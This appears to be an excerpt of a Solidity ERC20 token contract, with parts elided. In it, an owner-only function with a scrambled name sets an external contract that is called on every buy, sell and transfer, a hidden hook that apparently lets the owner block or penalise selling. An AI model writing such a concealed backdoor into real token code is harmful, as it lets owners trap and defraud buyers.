...
contract TokenM is ERC20 {
    ...
    IUserAmounttcpoer public tcpoer;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Blockchain", "BWE") {
    ...
    function cdoeskenBningsRoeed(IUserAmounttcpoer _tcpoer) public onlyOwner {
        tcpoer = _tcpoer;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                tcpoer.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				tcpoer.addOutAmount(from, amount);
            }else{
                tcpoer.addOutAmount(from, amount);
                takeFee = false;
            }
